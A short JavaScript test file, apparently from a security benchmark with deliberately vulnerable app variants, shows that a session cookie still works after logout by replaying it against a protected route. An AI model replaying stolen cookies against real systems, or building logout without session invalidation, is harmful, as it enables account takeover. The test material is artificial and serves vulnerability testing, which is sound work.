import request from 'supertest';
import { loadVariantApp } from '../load-variant-app';
import { resetDatabase } from '../../setup';
import { prisma } from '../../../src/db';

const app = loadVariantApp();

describe('Session logout misconfiguration exploit', () => {
  beforeEach(async () => {
    await resetDatabase();

    await prisma.user.create({
      data: {
        id: '123e4567-e89b-12d3-a456-426614174000',
        email: 'test@example.com',
        password: 'password',
      },
    });
  });

  it('allows replay of a stolen cookie after logout', async () => {
    const loginRes = await request(app)
      .post('/sessions/login')
      .send({ email: 'test@example.com', password: 'password' });

    const cookieHeader = loginRes.headers['set-cookie'];
    const sessionCookie = Array.isArray(cookieHeader) ? cookieHeader[0] : '';

    const logoutRes = await request(app).post('/sessions/logout').set('Cookie', sessionCookie);

    expect(logoutRes.status).toBe(200);

    const replayRes = await request(app).get('/sessions/protected').set('Cookie', sessionCookie);

    expect(replayRes.status).toBe(200);
    expect(replayRes.body.userId).toBe('123e4567-e89b-12d3-a456-426614174000');
  });
});
